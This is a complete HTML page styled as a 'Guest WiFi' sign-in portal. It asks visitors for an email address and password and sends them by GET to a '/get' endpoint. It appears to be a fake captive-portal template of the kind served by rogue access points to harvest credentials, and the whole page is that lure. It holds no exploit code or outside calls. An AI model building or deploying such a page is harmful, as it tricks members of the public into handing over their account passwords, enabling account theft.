<!doctype html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1"><title>WiFi Sign In</title>
<style>
 body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1f3c88,#122754);
      min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
 .card{background:#fff;padding:36px 28px;border-radius:10px;width:320px;
       box-shadow:0 8px 30px rgba(0,0,0,.35);text-align:center}
 h1{font-size:20px;margin:0 0 6px}p{color:#666;font-size:13px;margin:0 0 18px}
 input{width:100%;padding:12px;margin:6px 0;border:1px solid #ccc;border-radius:6px;
       box-sizing:border-box;font-size:15px}
 button{width:100%;padding:12px;margin-top:10px;background:#1f3c88;color:#fff;border:0;
        border-radius:6px;font-size:16px}
 .fine{font-size:11px;color:#999;margin-top:14px}
</style></head><body>
<div class="card">
  <h1>Guest WiFi</h1>
  <p>Sign in to get online</p>
  <form action="/get" method="GET">
    <input name="email" type="email" placeholder="Email address" required>
    <input name="password" type="password" placeholder="Password" required>
    <button type="submit">Connect</button>
  </form>
  <div class="fine">By connecting you agree to the terms of service</div>
</div>
</body></html>
